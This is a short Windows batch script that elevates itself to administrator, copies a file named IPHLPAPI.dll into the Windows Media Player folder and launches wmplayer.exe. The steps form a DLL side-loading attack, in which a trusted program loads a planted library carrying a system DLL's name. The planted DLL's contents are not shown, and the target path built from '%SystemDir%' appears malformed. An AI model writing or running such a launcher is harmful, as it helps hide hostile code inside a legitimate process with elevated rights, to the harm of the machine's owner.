@echo off

if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

xcopy /Y "%~dp0\IPHLPAPI.dll" "%SystemDir%\Program Files (x86)\Windows Media Player"
cd "%SystemDir%\Program Files (x86)\Windows Media Player"
START wmplayer.exe